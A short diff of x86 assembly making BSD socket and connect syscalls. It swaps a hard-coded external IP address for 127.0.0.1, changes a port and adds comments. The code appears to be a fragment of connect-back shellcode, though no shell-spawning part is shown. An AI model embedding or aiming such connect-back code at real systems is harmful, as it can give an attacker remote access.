@@ -8,20 +8,20 @@ socket:
 	pushl %edx
 	incl  %edx
 	pushl %edx
-	pushl $0xbd53df8d
+	pushl $0x0100007f # ipaddr 127.0.0.1
 	int  $0x80
 
 connect:
-	pushl $0xa05b0210
+	pushl $0xbfbf0210 # port number
 	movl  %esp, %ecx
-	pushl  $0x10
-	pushl %ecx
-	pushl %eax
-	pushl %ecx
+	pushl  $0x10 # size
+	pushl %ecx # sockaddr *data
+	pushl %eax # socket
+	pushl %ecx 
 	
 	xchg %ebx, %eax 
 	
-	pushl $98
+	pushl $98 
 	popl  %eax
 	int  $0x80
 
